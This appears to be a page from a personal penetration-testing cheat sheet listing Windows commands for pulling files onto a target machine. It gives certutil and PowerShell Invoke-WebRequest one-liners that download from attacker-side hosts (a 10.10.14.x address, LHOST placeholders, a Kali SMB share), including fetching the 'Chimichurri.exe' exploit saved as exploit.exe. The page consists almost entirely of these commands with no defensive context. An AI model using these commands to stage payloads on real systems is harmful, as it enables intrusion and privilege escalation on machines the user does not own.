---
title: 5_Web
parent: Windows
grand_parent: General
nav_order: 5
---
# Web

```powershell
certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe exploit.exe
```


## Download
```powershell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

```powershell
iwr -uri http://lhost/file -Outfile file
```

```powershell
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```
![image](https://github.com/user-attachments/assets/0e89cadd-d41c-471d-9dae-8fc0d7a61cde)

```powershell
copy \\kali\share\file .
```

